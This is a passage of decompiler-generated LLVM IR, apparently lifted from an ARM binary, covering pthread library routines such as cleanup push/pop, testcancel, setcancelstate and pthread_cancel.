  %v1_e298 = load i32, i32* %r6.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_e2a0, %v1_e298
  br i1 %tmp, label %dec_label_pc_e2a0, label %dec_label_pc_e2b8.loopexit

dec_label_pc_e2a0:                                ; preds = %dec_label_pc_e298
  %v1_e2a0 = add i32 %v0_e2a0, 4
  %v2_e2a0 = inttoptr i32 %v1_e2a0 to i32*
  %v3_e2a0 = load i32, i32* %v2_e2a0, align 4
  store i32 %v3_e2a0, i32* %r0.global-to-local, align 4
  store i32 58028, i32* @lr, align 4
  %v1_e2a8 = inttoptr i32 %v0_e2a0 to i32*
  %v2_e2a8 = load i32, i32* %v1_e2a8, align 4
  call void @__pseudo_branch(i32 %v2_e2a8)
  %v0_e2ac = load i32, i32* %r4.global-to-local, align 4
  %v1_e2ac = add i32 %v0_e2ac, 12
  %v2_e2ac = inttoptr i32 %v1_e2ac to i32*
  %v3_e2ac = load i32, i32* %v2_e2ac, align 4
  store i32 %v3_e2ac, i32* %r4.global-to-local, align 4
  %v2_e2b0 = icmp eq i32 %v3_e2ac, 0
  br i1 %v2_e2b0, label %dec_label_pc_e2b8.loopexit, label %dec_label_pc_e298

dec_label_pc_e2b8.loopexit:                       ; preds = %dec_label_pc_e298, %dec_label_pc_e2a0
  %v0_e2b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e2b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e2b8.loopexit, %entry
  %v0_e2b8 = phi i32 [ %v0_e2b8.pre, %dec_label_pc_e2b8.loopexit ], [ %v0_e288, %entry ]
  %v1_e2b8 = add i32 %v0_e2b8, 372
  %v2_e2b8 = inttoptr i32 %v1_e2b8 to i32*
  %v3_e2b8 = load i32, i32* %v2_e2b8, align 4
  %v2_e2bc = icmp eq i32 %v3_e2b8, 0
  %v3_e2c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_e2c0, i32* @r4, align 4
  store i32 %v6_e280, i32* @r5, align 4
  store i32 %v9_e280, i32* @r6, align 4
  br i1 %v2_e2bc, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_e2b8
  %v15_e2c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_e2c0

bb8:                                              ; preds = %dec_label_pc_e2b8
  store i32 %v12_e280, i32* @lr, align 4
  %v0_e2c8 = call i32 @__rpc_thread_destroy()
  store i32 %v0_e2c8, i32* %r0.global-to-local, align 4
  ret i32 %v0_e2c8

; uselistorder directives
  uselistorder i32 %v3_e2ac, { 1, 2, 0 }
  uselistorder i32 %v0_e2a0, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_e2b8.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e298, { 1, 0 }
}

define i32 @__pthread_cleanup_push_defer() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e2cc = load i32, i32* @r4, align 4
  store i32 %v3_e2cc, i32* %stack_var_-16, align 4
  %v0_e2d0 = load i32, i32* @r0, align 4
  store i32 %v0_e2d0, i32* %r6.global-to-local, align 4
  %v0_e2d4 = load i32, i32* @r2, align 4
  store i32 %v0_e2d4, i32* %r5.global-to-local, align 4
  %v0_e2d8 = load i32, i32* @r1, align 4
  %v0_e2dc = call i32 @_thread_self.5()
  %v1_e2e0 = inttoptr i32 %v0_e2d0 to i32*
  store i32 %v0_e2d8, i32* %v1_e2e0, align 4
  %v3_e2e0 = add i32 %v0_e2d0, 4
  %v4_e2e0 = inttoptr i32 %v3_e2e0 to i32*
  %v5_e2e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v5_e2e0, i32* %v4_e2e0, align 4
  %v1_e2e4 = add i32 %v0_e2dc, 60
  %v2_e2e4 = inttoptr i32 %v1_e2e4 to i32*
  %v3_e2e4 = load i32, i32* %v2_e2e4, align 4
  store i32 %v3_e2e4, i32* %r2.global-to-local, align 4
  %v1_e2e8 = add i32 %v0_e2dc, 65
  %v2_e2e8 = inttoptr i32 %v1_e2e8 to i8*
  %v3_e2e8 = load i8, i8* %v2_e2e8, align 1
  %v4_e2e8 = zext i8 %v3_e2e8 to i32
  store i32 %v4_e2e8, i32* %r3.global-to-local, align 4
  %v2_e2ec = icmp eq i32 %v3_e2e4, 0
  %v1_e2f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2f0 = add i32 %v1_e2f0, 8
  %v3_e2f0 = inttoptr i32 %v2_e2f0 to i32*
  store i32 %v4_e2e8, i32* %v3_e2f0, align 4
  %v0_e2f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2f4 = add i32 %v1_e2f4, 12
  %v3_e2f4 = inttoptr i32 %v2_e2f4 to i32*
  store i32 %v0_e2f4, i32* %v3_e2f4, align 4
  br i1 %v2_e2ec, label %.thread, label %dec_label_pc_e2fc

dec_label_pc_e2fc:                                ; preds = %entry
  %v0_e2fc = load i32, i32* %r6.global-to-local, align 4
  %v1_e2fc = load i32, i32* %r2.global-to-local, align 4
  %v3_e2fc = icmp ult i32 %v0_e2fc, %v1_e2fc
  br i1 %v3_e2fc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e2fc
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e304 = add i32 %v0_e2fc, 12
  %v4_e304 = inttoptr i32 %v3_e304 to i32*
  store i32 0, i32* %v4_e304, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e2fc, %entry, %bb
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_e30c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e30c, i32* %v2_e2e4, align 4
  %v0_e310 = load i32, i32* %r3.global-to-local, align 4
  %v1_e310 = trunc i32 %v0_e310 to i8
  store i8 %v1_e310, i8* %v2_e2e8, align 1
  %v2_e314 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e314, i32* @r4, align 4
  ret i32 %v0_e2dc

; uselistorder directives
  uselistorder i32 %v0_e2dc, { 0, 2, 1 }
  uselistorder i32 %v0_e2d0, { 1, 0, 2 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v2_e318 = icmp eq i32 %arg2, 0
  %v3_e31c = load i32, i32* @r4, align 4
  store i32 %v3_e31c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_e318, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v4_e32c = call i32 @unknown_0()
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_e330 = call i32 @_thread_self.5()
  %v0_e334 = load i32, i32* %r4.global-to-local, align 4
  %v1_e334 = add i32 %v0_e334, 12
  %v2_e334 = inttoptr i32 %v1_e334 to i32*
  %v3_e334 = load i32, i32* %v2_e334, align 4
  %v2_e338 = add i32 %v0_e330, 60
  %v3_e338 = inttoptr i32 %v2_e338 to i32*
  store i32 %v3_e334, i32* %v3_e338, align 4
  %v2_e33c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e33c, i32* @r4, align 4
  ret i32 %v0_e330

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_e340 = load i32, i32* @r4, align 4
  store i32 %v3_e340, i32* %stack_var_-16, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v0_e350 = call i32 @_thread_self.5()
  %v1_e354 = add i32 %v0_e350, 60
  %v2_e354 = inttoptr i32 %v1_e354 to i32*
  %v3_e354 = load i32, i32* %v2_e354, align 4
  store i32 %v3_e354, i32* %r3.global-to-local, align 4
  %v2_e358 = icmp eq i32 %v3_e354, 0
  %v0_e35c = load i32, i32* %r6.global-to-local, align 4
  %v1_e35c = inttoptr i32 %v0_e35c to i32*
  %v2_e35c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v2_e35c, i32* %v1_e35c, align 4
  %v3_e35c = add i32 %v0_e35c, 4
  %v4_e35c = inttoptr i32 %v3_e35c to i32*
  %v5_e35c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v5_e35c, i32* %v4_e35c, align 4
  %v0_e360 = load i32, i32* %r3.global-to-local, align 4
  %v1_e360 = load i32, i32* %r6.global-to-local, align 4
  %v2_e360 = add i32 %v1_e360, 12
  %v3_e360 = inttoptr i32 %v2_e360 to i32*
  store i32 %v0_e360, i32* %v3_e360, align 4
  br i1 %v2_e358, label %.thread, label %dec_label_pc_e368

dec_label_pc_e368:                                ; preds = %entry
  %v0_e368 = load i32, i32* %r6.global-to-local, align 4
  %v1_e368 = load i32, i32* %r3.global-to-local, align 4
  %v3_e368 = icmp ult i32 %v0_e368, %v1_e368
  br i1 %v3_e368, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e368
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e370 = add i32 %v0_e368, 12
  %v4_e370 = inttoptr i32 %v3_e370 to i32*
  store i32 0, i32* %v4_e370, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e368, %entry, %bb
  %v0_e374 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e374, i32* %v2_e354, align 4
  %v2_e378 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e378, i32* @r4, align 4
  ret i32 %v0_e350

; uselistorder directives
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e37c = load i32, i32* @r4, align 4
  store i32 %v3_e37c, i32* %stack_var_-16, align 4
  %v6_e37c = load i32, i32* @r5, align 4
  %v13_e37c = ptrtoint i32* %stack_var_-16 to i32
  %v0_e380 = load i32, i32* @r1, align 4
  %v0_e384 = load i32, i32* @r0, align 4
  store i32 %v0_e384, i32* %r5.global-to-local, align 4
  %v0_e388 = call i32 @_thread_self.5()
  store i32 %v0_e388, i32* %r0.global-to-local, align 4
  %v2_e38c = icmp eq i32 %v0_e380, 0
  store i1 %v2_e38c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e388, i32* %r6.global-to-local, align 4
  br i1 %v2_e38c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v1_e394 = load i32, i32* %r5.global-to-local, align 4
  %v2_e394 = add i32 %v1_e394, 4
  %v3_e394 = inttoptr i32 %v2_e394 to i32*
  %v4_e394 = load i32, i32* %v3_e394, align 4
  store i32 %v4_e394, i32* %r0.global-to-local, align 4
  store i32 58272, i32* @lr, align 4
  %v4_e39c = call i32 @unknown_0()
  store i32 %v4_e39c, i32* %r0.global-to-local, align 4
  %v0_e3a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v1_e3b0 = phi i32 [ %v0_e388, %entry ], [ %v0_e3a0.pre, %bb ]
  %v1_e3a0 = add i32 %v1_e3b0, 66
  %v2_e3a0 = inttoptr i32 %v1_e3a0 to i8*
  %v3_e3a0 = load i8, i8* %v2_e3a0, align 1
  %v0_e3a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_e3a4 = add i32 %v0_e3a4, 8
  store i32 %v1_e3a4, i32* %r1.global-to-local, align 4
  %v1_e3a8 = inttoptr i32 %v1_e3a4 to i32*
  %v2_e3a8 = load i32, i32* %v1_e3a8, align 4
  store i32 %v2_e3a8, i32* %r1.global-to-local, align 4
  %v3_e3a8 = add i32 %v0_e3a4, 12
  %v4_e3a8 = inttoptr i32 %v3_e3a8 to i32*
  %v5_e3a8 = load i32, i32* %v4_e3a8, align 4
  %v2_e3ac = icmp eq i8 %v3_e3a0, 0
  store i1 %v2_e3ac, i1* %cpsr_z.global-to-local, align 1
  %v2_e3b0 = add i32 %v1_e3b0, 60
  %v3_e3b0 = inttoptr i32 %v2_e3b0 to i32*
  store i32 %v5_e3a8, i32* %v3_e3b0, align 4
  %v0_e3b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_e3b4 = trunc i32 %v0_e3b4 to i8
  %v2_e3b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_e3b4 = add i32 %v2_e3b4, 65
  %v4_e3b4 = inttoptr i32 %v3_e3b4 to i8*
  store i8 %v1_e3b4, i8* %v4_e3b4, align 1
  %v0_e3b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e3b8, label %bb7, label %bb8

bb7:                                              ; preds = %.thread1
  %v3_e3b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_e3b8, i32* @r4, align 4
  store i32 %v6_e37c, i32* @r5, align 4
  %v15_e3b8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_e3b8

bb8:                                              ; preds = %.thread1
  %v0_e3bc = load i32, i32* %r6.global-to-local, align 4
  %v1_e3bc = add i32 %v0_e3bc, 65
  %v2_e3bc = inttoptr i32 %v1_e3bc to i8*
  %v3_e3bc = load i8, i8* %v2_e3bc, align 1
  %v4_e3bc = zext i8 %v3_e3bc to i32
  %v1_e3c0 = add i32 %v0_e3bc, 64
  %v2_e3c0 = inttoptr i32 %v1_e3c0 to i8*
  %v3_e3c0 = load i8, i8* %v2_e3c0, align 1
  %v4_e3c0 = zext i8 %v3_e3c0 to i32
  %v4_e3c4 = mul nuw nsw i32 %v4_e3bc, 256
  %v5_e3c4 = or i32 %v4_e3c0, %v4_e3c4
  %v7_e3c8 = icmp eq i32 %v5_e3c4, 256
  store i1 %v7_e3c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e3c8, label %bb10, label %bb9

bb9:                                              ; preds = %bb8
  %v3_e3cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_e3cc, i32* @r4, align 4
  store i32 %v6_e37c, i32* @r5, align 4
  %v15_e3cc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_e3cc

bb10:                                             ; preds = %bb8
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v13_e37c, i32* %r1.global-to-local, align 4
  %v2_e3d8 = call i32 @__pthread_do_exit(i32 -1, i32 %v13_e37c)
  store i32 %v2_e3d8, i32* %r0.global-to-local, align 4
  ret i32 %v2_e3d8

; uselistorder directives
  uselistorder i32 %v13_e37c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 4, 5, 0, 2, 6 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_e3dc = load i32, i32* @lr, align 4
  store i32 %v0_e3dc, i32* %stack_var_-4, align 4
  %v6_e3dc = ptrtoint i32* %stack_var_-4 to i32
  %v0_e3e0 = call i32 @_thread_self.5()
  %v1_e3e4 = add i32 %v0_e3e0, 66
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i8*
  %v3_e3e4 = load i8, i8* %v2_e3e4, align 1
  %v2_e3e8 = icmp eq i8 %v3_e3e4, 0
  br i1 %v2_e3e8, label %bb, label %bb2

bb:                                               ; preds = %entry
  ret i32 %v0_e3e0

bb2:                                              ; preds = %entry
  %v1_e3f0 = add i32 %v0_e3e0, 64
  %v2_e3f0 = inttoptr i32 %v1_e3f0 to i8*
  %v3_e3f0 = load i8, i8* %v2_e3f0, align 1
  %v2_e3f4 = icmp eq i8 %v3_e3f0, 0
  br i1 %v2_e3f4, label %bb4, label %bb3

bb3:                                              ; preds = %bb2
  ret i32 %v0_e3e0

bb4:                                              ; preds = %bb2
  %v2_e404 = call i32 @__pthread_do_exit(i32 -1, i32 %v6_e3dc)
  ret i32 %v2_e404

; uselistorder directives
  uselistorder i32 %v0_e3e0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v2_e408 = icmp ne i8 %arg1, 0
  %v7_e408 = icmp eq i8 %arg1, 1
  store i1 %v7_e408, i1* %cpsr_z.global-to-local, align 1
  %v3_e40c = load i32, i32* @r4, align 4
  store i32 %v3_e40c, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_e418 = xor i1 %v7_e408, true
  %v3_e418 = and i1 %v2_e408, %v2_e418
  br i1 %v3_e418, label %bb, label %bb12

bb:                                               ; preds = %entry
  store i32 %v3_e40c, i32* @r4, align 4
  ret i32 22

bb12:                                             ; preds = %entry
  %v0_e420 = call i32 @_thread_self.5()
  %v0_e424 = load i32, i32* %r4.global-to-local, align 4
  %v2_e424 = icmp eq i32 %v0_e424, 0
  store i1 %v2_e424, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_e420, 65
  %.pre4 = inttoptr i32 %.pre to i8*
  br i1 %v2_e424, label %.thread, label %bb13

bb13:                                             ; preds = %bb12
  %v4_e428 = load i8, i8* %.pre4, align 1
  %v5_e428 = zext i8 %v4_e428 to i32
  %v3_e42c = inttoptr i32 %v0_e424 to i32*
  store i32 %v5_e428, i32* %v3_e42c, align 4
  br label %.thread

.thread:                                          ; preds = %bb12, %bb13
  %v1_e430 = add i32 %v0_e420, 66
  %v2_e430 = inttoptr i32 %v1_e430 to i8*
  %v3_e430 = load i8, i8* %v2_e430, align 1
  %v2_e434 = icmp eq i8 %v3_e430, 0
  store i1 %v2_e434, i1* %cpsr_z.global-to-local, align 1
  %v0_e438 = load i32, i32* %r5.global-to-local, align 4
  %v1_e438 = trunc i32 %v0_e438 to i8
  store i8 %v1_e438, i8* %.pre4, align 1
  %v0_e43c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e43c, label %dec_label_pc_e45c, label %dec_label_pc_e440

dec_label_pc_e440:                                ; preds = %.thread
  %v4_e440 = urem i32 %v0_e438, 256
  %v1_e444 = add i32 %v0_e420, 64
  %v2_e444 = inttoptr i32 %v1_e444 to i8*
  %v3_e444 = load i8, i8* %v2_e444, align 1
  %v4_e444 = zext i8 %v3_e444 to i32
  %v4_e448 = mul nuw nsw i32 %v4_e440, 256
  %v5_e448 = or i32 %v4_e444, %v4_e448
  %v7_e44c = icmp eq i32 %v5_e448, 256
  store i1 %v7_e44c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e44c, label %bb14, label %.thread1

bb14:                                             ; preds = %dec_label_pc_e440
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e440, %bb14
  store i32 58460, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_e44c, i32 ptrtoint (i32* @global_var_ecfc.433 to i32))
  br label %dec_label_pc_e45c

dec_label_pc_e45c:                                ; preds = %.thread, %.thread1
  %v2_e460 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e460, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_e420, { 1, 2, 0 }
  uselistorder i1 %v7_e408, { 1, 0 }
  uselistorder label %dec_label_pc_e45c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v2_e464 = icmp ne i8 %arg1, 0
  %v7_e464 = icmp eq i8 %arg1, 1
  store i1 %v7_e464, i1* %cpsr_z.global-to-local, align 1
  %v3_e468 = load i32, i32* @r4, align 4
  store i32 %v3_e468, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_e474 = xor i1 %v7_e464, true
  %v3_e474 = and i1 %v2_e464, %v2_e474
  br i1 %v3_e474, label %bb, label %bb12

bb:                                               ; preds = %entry
  store i32 %v3_e468, i32* %r4.global-to-local, align 4
  ret i32 22

bb12:                                             ; preds = %entry
  %v0_e47c = call i32 @_thread_self.5()
  %v0_e480 = load i32, i32* %r4.global-to-local, align 4
  %v2_e480 = icmp eq i32 %v0_e480, 0
  store i1 %v2_e480, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_e47c, 64
  %.pre4 = inttoptr i32 %.pre to i8*
  br i1 %v2_e480, label %.thread, label %bb13

bb13:                                             ; preds = %bb12
  %v4_e484 = load i8, i8* %.pre4, align 1
  %v5_e484 = zext i8 %v4_e484 to i32
  %v3_e488 = inttoptr i32 %v0_e480 to i32*
  store i32 %v5_e484, i32* %v3_e488, align 4
  br label %.thread

.thread:                                          ; preds = %bb12, %bb13
  %v1_e48c = add i32 %v0_e47c, 66
  %v2_e48c = inttoptr i32 %v1_e48c to i8*
  %v3_e48c = load i8, i8* %v2_e48c, align 1
  %v2_e490 = icmp eq i8 %v3_e48c, 0
  store i1 %v2_e490, i1* %cpsr_z.global-to-local, align 1
  %v0_e494 = load i32, i32* %r5.global-to-local, align 4
  %v1_e494 = trunc i32 %v0_e494 to i8
  store i8 %v1_e494, i8* %.pre4, align 1
  %v0_e498 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e498, label %dec_label_pc_e4b8, label %dec_label_pc_e49c

dec_label_pc_e49c:                                ; preds = %.thread
  %v1_e49c = add i32 %v0_e47c, 65
  %v2_e49c = inttoptr i32 %v1_e49c to i8*
  %v3_e49c = load i8, i8* %v2_e49c, align 1
  %v4_e49c = zext i8 %v3_e49c to i32
  %v3_e4a0 = load i8, i8* %.pre4, align 1
  %v4_e4a0 = zext i8 %v3_e4a0 to i32
  %v4_e4a4 = mul nuw nsw i32 %v4_e49c, 256
  %v5_e4a4 = or i32 %v4_e4a0, %v4_e4a4
  %v7_e4a8 = icmp eq i32 %v5_e4a4, 256
  store i1 %v7_e4a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4a8, label %bb14, label %.thread1

bb14:                                             ; preds = %dec_label_pc_e49c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e49c, %bb14
  call void @__pseudo_cond_branch(i1 %v7_e4a8, i32 ptrtoint (i32* @global_var_ecfc.433 to i32))
  br label %dec_label_pc_e4b8

dec_label_pc_e4b8:                                ; preds = %.thread, %.thread1
  %v2_e4bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e4bc, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_e47c, { 1, 2, 0 }
  uselistorder i1 %v7_e464, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ()* @_thread_self.5, { 5, 0, 2, 4, 7, 6, 3, 1 }
  uselistorder label %dec_label_pc_e4b8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e4c8 = urem i32 %arg1, 1024
  %v4_e4d0 = mul nuw nsw i32 %v3_e4c8, 16
  %v5_e4d0 = add i32 %v4_e4d0, ptrtoint (i32* @global_var_263c0.205 to i32)
  store i32 %v5_e4d0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  store i32 %v5_e4d0, i32* %r0.global-to-local, align 4
  %v2_e4e0 = call i32 @__pthread_lock(i32 %v5_e4d0, i32 0)
  store i32 %v2_e4e0, i32* %r0.global-to-local, align 4
  %v1_e4e4 = add i32 %v4_e4d0, add (i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32 8)
  %v2_e4e4 = inttoptr i32 %v1_e4e4 to i32*
  %v3_e4e4 = load i32, i32* %v2_e4e4, align 4
  store i32 %v3_e4e4, i32* @r4, align 4
  %v2_e4e8 = icmp eq i32 %v3_e4e4, 0
  store i1 %v2_e4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4e8, label %dec_label_pc_e504, label %dec_label_pc_e4f0

dec_label_pc_e4f0:                                ; preds = %entry
  %v1_e4f0 = add i32 %v3_e4e4, 16
  %v2_e4f0 = inttoptr i32 %v1_e4f0 to i32*
  %v3_e4f0 = load i32, i32* %v2_e4f0, align 4
  %v1_e4f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_e4f4 = sub i32 %v3_e4f0, %v1_e4f4
  store i32 %v2_e4f4, i32* %r5.global-to-local, align 4
  %v9_e4f4 = icmp eq i32 %v3_e4f0, %v1_e4f4
  store i1 %v9_e4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e4f4, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_e4f0
  store i32 1, i32* %r5.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e504

bb:                                               ; preds = %dec_label_pc_e4f0
  %v2_e4fc = icmp eq i32 %v2_e4f4, 0
  store i1 %v2_e4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4fc, label %dec_label_pc_e514, label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %.thread, %bb, %entry
  store i32 %v5_e4d0, i32* %r0.global-to-local, align 4
  %v1_e508 = call i32 @__pthread_unlock(i32 %v5_e4d0)
  store i32 3, i32* %r0.global-to-local, align 4
  ret i32 3

dec_label_pc_e514:                                ; preds = %bb
  %v1_e514 = add i32 %v3_e4e4, 66
  %v2_e514 = inttoptr i32 %v1_e514 to i8*
  %v3_e514 = load i8, i8* %v2_e514, align 1
  %v4_e514 = zext i8 %v3_e514 to i32
  %v1_e518 = add i32 %v3_e4e4, 64
  %v2_e518 = inttoptr i32 %v1_e518 to i8*
  %v3_e518 = load i8, i8* %v2_e518, align 1
  %v2_e51c = icmp eq i8 %v3_e514, 0
  store i1 %v2_e51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e51c, label %bb12, label %bb11

bb11:                                             ; preds = %dec_label_pc_e514
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_e514, %bb11
  %v1_e528 = phi i32 [ %v4_e514, %dec_label_pc_e514 ], [ 1, %bb11 ]
  %v7_e524 = icmp eq i8 %v3_e518, 1
  store i1 %v7_e524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e524, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  br label %bb14

bb14:                                             ; preds = %bb12, %bb13
  %v0_e52c = phi i32 [ %v1_e528, %bb12 ], [ 1, %bb13 ]
  %v2_e52c = icmp eq i32 %v0_e52c, 0
  store i1 %v2_e52c, i1* %cpsr_z.global-to-local, align 1
  store i8 1, i8* %v2_e514, align 1
  %v0_e538 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e538, label %dec_label_pc_e54c, label %dec_label_pc_e53c

dec_label_pc_e53c:                                ; preds = %bb14
  %v0_e53c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e53c, i32* %r0.global-to-local, align 4
  %v1_e540 = call i32 @__pthread_unlock(i32 %v0_e53c)
  %v0_e544 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e544, i32* %r0.global-to-local, align 4
  ret i32 %v0_e544

dec_label_pc_e54c:                                ; preds = %bb14
  %v0_e54c = load i32, i32* @r4, align 4
  %v1_e54c = add i32 %v0_e54c, 444
  %v2_e54c = inttoptr i32 %v1_e54c to i32*
  %v3_e54c = load i32, i32* %v2_e54c, align 4
  %v2_e550 = icmp eq i32 %v3_e54c, 0
  store i1 %v2_e550, i1* %cpsr_z.global-to-local, align 1
  %v1_e554 = add i32 %v0_e54c, 20
  %v2_e554 = inttoptr i32 %v1_e554 to i32*
  %v3_e554 = load i32, i32* %v2_e554, align 4
  store i32 %v3_e554, i32* %r7.global-to-local, align 4
  br i1 %v2_e550, label %dec_label_pc_e578, label %dec_label_pc_e560

dec_label_pc_e560:                                ; preds = %dec_label_pc_e54c
  %v1_e560 = inttoptr i32 %v3_e54c to i32*
  %v2_e560 = load i32, i32* %v1_e560, align 4
  store i32 %v2_e560, i32* %r0.global-to-local, align 4
